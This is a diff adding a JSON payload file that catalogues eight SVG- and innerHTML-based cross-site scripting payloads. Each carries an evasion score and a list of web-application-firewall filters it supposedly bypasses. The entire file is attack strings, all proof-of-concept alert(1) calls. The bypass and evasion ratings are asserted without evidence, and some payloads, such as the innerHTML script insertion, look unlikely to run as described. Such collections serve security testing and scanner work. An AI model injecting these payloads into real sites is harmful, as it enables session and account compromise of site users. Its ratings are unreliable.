@@ -1,0 +1,145 @@
+{
+  "category": "innerhtml_svg_namespace",
+  "description": "SVG injection via innerHTML with namespace manipulation",
+  "difficulty": "god_tier_advanced",
+  "payloads": [
+    {
+      "name": "svg_script_innerhtml",
+      "payload": "<div id=\"xss\"></div><script>document.getElementById(\"xss\").innerHTML = `<svg><script>alert(1)</script>`;</script>",
+      "description": "Basic SVG script injection via innerHTML",
+      "context": [
+        "innerHTML",
+        "svg",
+        "script_tag",
+        "namespace"
+      ],
+      "encoding": "none",
+      "evasion_level": 8,
+      "waf_bypass": [
+        "svg_filters",
+        "innerHTML_detection",
+        "script_detection"
+      ]
+    },
+    {
+      "name": "svg_foreignobject_namespace",
+      "payload": "<svg><foreignObject><div xmlns=\"http://www.w3.org/1999/xhtml\"><script>alert(1)</script></div></foreignObject></svg>",
+      "description": "SVG foreignObject with XHTML namespace injection",
+      "context": [
+        "svg",
+        "foreignObject",
+        "xhtml_namespace",
+        "mixed_namespace"
+      ],
+      "encoding": "none",
+      "evasion_level": 10,
+      "waf_bypass": [
+        "foreignObject_filters",
+        "namespace_detection",
+        "xhtml_filters"
+      ]
+    },
+    {
+      "name": "svg_animatetransform_injection",
+      "payload": "<svg><animateTransform onbegin=alert(1)>",
+      "description": "SVG animateTransform event handler injection",
+      "context": [
+        "svg",
+        "animateTransform",
+        "onbegin",
+        "animation"
+      ],
+      "encoding": "none",
+      "evasion_level": 9,
+      "waf_bypass": [
+        "svg_animation_filters",
+        "onbegin_detection"
+      ]
+    },
+    {
+      "name": "svg_use_href_injection",
+      "payload": "<svg><use href=\"javascript:alert(1)\"/>",
+      "description": "SVG use element with javascript href",
+      "context": [
+        "svg",
+        "use_element",
+        "href",
+        "javascript_protocol"
+      ],
+      "encoding": "none",
+      "evasion_level": 8,
+      "waf_bypass": [
+        "svg_use_filters",
+        "href_detection"
+      ]
+    },
+    {
+      "name": "svg_image_onerror",
+      "payload": "<svg><image href=x onerror=alert(1)>",
+      "description": "SVG image element with onerror handler",
+      "context": [
+        "svg",
+        "image_element",
+        "onerror",
+        "error_handler"
+      ],
+      "encoding": "none",
+      "evasion_level": 7,
+      "waf_bypass": [
+        "svg_image_filters",
+        "onerror_detection"
+      ]
+    },
+    {
+      "name": "svg_innerhtml_mixed_namespace",
+      "payload": "document.body.innerHTML='<svg xmlns=\"http://www.w3.org/2000/svg\"><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script></svg>';",
+      "description": "Mixed namespace SVG+XHTML via innerHTML",
+      "context": [
+        "innerHTML",
+        "mixed_namespace",
+        "svg_namespace",
+        "xhtml_namespace"
+      ],
+      "encoding": "none",
+      "evasion_level": 10,
+      "waf_bypass": [
+        "mixed_namespace_filters",
+        "innerHTML_svg_detection"
+      ]
+    },
+    {
+      "name": "svg_set_element_injection",
+      "payload": "<svg><set attributeName=onmouseover to=alert(1)>",
+      "description": "SVG set element dynamic attribute injection",
+      "context": [
+        "svg",
+        "set_element",
+        "attributeName",
+        "dynamic_attribute"
+      ],
+      "encoding": "none",
+      "evasion_level": 9,
+      "waf_bypass": [
+        "svg_set_filters",
+        "attributeName_detection"
+      ]
+    },
+    {
+      "name": "svg_mpath_injection",
+      "payload": "<svg><mpath onload=alert(1)>",
+      "description": "SVG mpath element with onload handler",
+      "context": [
+        "svg",
+        "mpath",
+        "onload",
+        "motion_path"
+      ],
+      "encoding": "none",
+      "evasion_level": 8,
+      "waf_bypass": [
+        "mpath_filters",
+        "svg_onload_detection"
+      ]
+    }
+  ]
+}
